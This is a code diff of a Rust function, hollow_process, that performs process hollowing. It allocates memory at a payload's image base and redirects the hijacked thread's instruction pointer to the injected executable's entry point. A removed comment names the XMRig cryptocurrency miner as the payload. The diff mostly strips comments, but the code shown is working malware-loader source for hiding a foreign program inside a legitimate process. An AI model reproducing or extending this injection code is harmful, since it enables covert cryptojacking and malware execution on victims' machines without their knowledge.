@@ -99,12 +99,6 @@ pub unsafe fn hollow_process(target_exe: &str, pe_payload: &[u8]) -> Result<u32,
     );
     
     if status != 0 {
-        // Fallback: Allocate anywhere (Requires Relocations handling, but simplified here assuming success or crash)
-        // In stable/simplified version, strict ImageBase match is preferred (No relocs needed).
-        // If this fails, the injection likely won't work for complex binaries without manual relocs.
-        // We attempt to continue but it might crash if payload isn't PIC or Relocatable.
-        // But XMRig usually has reloc table.
-        // For 'Simulation', we assume success if unmap worked or space was free.
         return Err(format!("NtAllocateVirtualMemory failed (Constraint: ImageBase): 0x{:X}", status));
     }
 
@@ -150,12 +144,8 @@ pub unsafe fn hollow_process(target_exe: &str, pe_payload: &[u8]) -> Result<u32,
         return Err("GetThreadContext failed".to_string());
     }
 
-    // Update RCX (entry point) for 64-bit. Actually, RDX/RCX depends on calling convention,
-    // but typically we update the Instruction Pointer (Rip).
-    // Start Address = ImageBase + EntryPoint
+    // Update entry point
     ctx.Rip = (module_base as u64) + entry_point as u64;
-    // Also optional: Update Rcx to PEB if needed, but Windows Loader usually sets PEB in register.
-    // If we overwrote the original image at ImageBase, PEB might still point there which is good.
 
     if SetThreadContext(h_thread, &ctx) == 0 {
         return Err("SetThreadContext failed".to_string());
